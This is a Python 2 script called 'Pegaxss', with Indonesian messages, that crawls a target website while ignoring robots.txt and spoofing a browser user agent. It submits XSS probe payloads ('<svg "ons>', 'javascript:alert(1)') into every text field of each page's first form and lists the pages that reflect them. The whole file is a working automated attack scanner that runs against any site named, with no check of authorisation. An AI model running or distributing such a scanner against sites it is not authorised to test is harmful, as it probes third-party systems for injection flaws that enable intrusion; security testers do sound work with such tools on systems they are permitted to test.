import mechanize
import sys

br = mechanize.Browser()	#initiating the browser
br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')]
br.set_handle_robots(False)
br.set_handle_refresh(False)


class color:
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'


print color.BOLD + color.RED + """

Pegaxss
Programmer : Muhammad Sobri Maulana
Email      : sobri3195@gmail.com
Cara pakai : pegaxss.py website.com (Jangan ketik www.website.com OR http://www.website.com)
Aktivasi: python pegaxss.py website.com -e
""" + color.END


def initializeAndFind(firstDomains):

	dummy = 0	#dummy variable for doing nothing
	firstDomains = []	#list of domains
	if len(sys.argv) >=2:	#if the url has been passed or not
		url = sys.argv[1]
	else:
		print "Url tidak benar"
		return 0

	smallurl = sys.argv[1]	#small url is the part of url without http and www

	allURLS = []
	allURLS.append(url)	#just one url at the moment
	largeNumberOfUrls = []	#in case one wants to do comprehensive search

	noSecondParameter = 0
	if len(sys.argv) < 3:
		noSecondParameter = 0
	else:
		noSecondParameter = 1
	if sys.argv[1]:
		print "Melakukan transversal targel."	#doing a short traversal if no command line argument is being passed
		for url in allURLS:
			x = str(url)
			smallurl = x
			url = "http://www." + str(url)
			try:
				br.open(url)
				print "Menemukan semua link xss di website tersebut " + str(url)
				try:
					for link in br.links():		#finding the links of the website
						if smallurl in str(link.absolute_url):
							firstDomains.append(str(link.absolute_url))
					firstDomains = list(set(firstDomains))
				except:
					dummy = 0
			except:
				dummy = 0
		print "Jumlah link tersedia: " + str(len(firstDomains))

	if noSecondParameter != 0:
		if(sys.argv[2] == "-e"):		#if we want to do comprehensive traversal, we pass -e as command line argument
			print "Tunggu sejenak."
			for link in firstDomains:
				try:
					br.open(link)
					try:
						for newlink in br.links():	#going deeper into each link and finding its links
							if smallurl in str(newlink.absolute_url):
								largeNumberOfUrls.append(newlink.absolute_url)
					except:
						dummy = 0
				except:
					dummy = 0

			firstDomains = list(set(firstDomains + largeNumberOfUrls))
			print "Jumlah link xss: " + str(len(firstDomains))	#all links have been found
	return firstDomains


def findxss(firstDomains):
	print "Mencari kelemahan sistem xss"	#starting finding XSS
	xssLinks = []			#TOTAL CROSS SITE SCRIPTING FINDINGS
	count = 0			#to check for forms
	dummyVar = 0			#dummy variable for doing nothing
	if len(firstDomains) > 0:	#if there is atleast one link
		for link in firstDomains:
			y = str(link)
			print str(link)
			if 'jpg' in y:		#just a small check
				print "Tidak bagus"
			elif 'pdf' in y:
				print "Tidak bagus"
			else:
				try:
					br.open(str(link))	#open the link
				except:
					dummyVar = 0
				try:
					for form in br.forms():	#check its forms
						count = count + 1
				except:
					dummyVar = 0
				if count > 0:		#if a form exists, submit it
					try:
						params = list(br.forms())[0]	#our form
					except:
						dummyVar = 0
					try:
						br.select_form(nr=0)	#submit the first form
					except:
						dummyVar = 0
					for p in params.controls:
						par = str(p)
						if 'TextControl' in par:		#submit only those forms which require text
							print str(p.name)
							try:
								br.form[str(p.name)] = '<svg "ons>'		#our payload
							except:
								dummyVar = 0
							try:
								br.submit()
							except:
								dummyVar = 0
							try:
								if '<svg "ons>' in br.response().read():	#if payload is found in response, we have XSS
									print "\n\nXss ditemukan dan linknya berupa" + str(link) + " Payloadnya berupa <svg \"ons>" + "\n\n"
									xssLinks.append(link)
								else:
									dummyVar = 0
							except:
								print "Tidak dapat membaca halaman"
							try:
								br.back()
							except:
								dummyVar = 0

							#SECOND PAYLOAD

							try:
								br.form[str(p.name)] = 'javascript:alert(1)'	#second payload
							except:
								dummyVar = 0
							try:
								br.submit()
							except:
								dummyVar = 0
							try:
								if '<a href="javascript:alert(1)' in br.response().read():
									print "\n\nXss ditemukan dan linknya berupa" + str(link) + " payloadnya berupa javascript:alert(1)" + "\n\n"
									xssLinks.append(link)
								else:
									dummyVar = 0
							except:
								print "tidak dapat membaca halaman"
							try:
								br.back()		#go back to the previous page
							except:
								dummyVar = 0
					count = 0
		for link in xssLinks:		#print all xss findings
			print link
	else:
		print "tidak ditemukan"

#calling the function
firstDomains = []
firstDomains = initializeAndFind(firstDomains)
findxss(firstDomains)
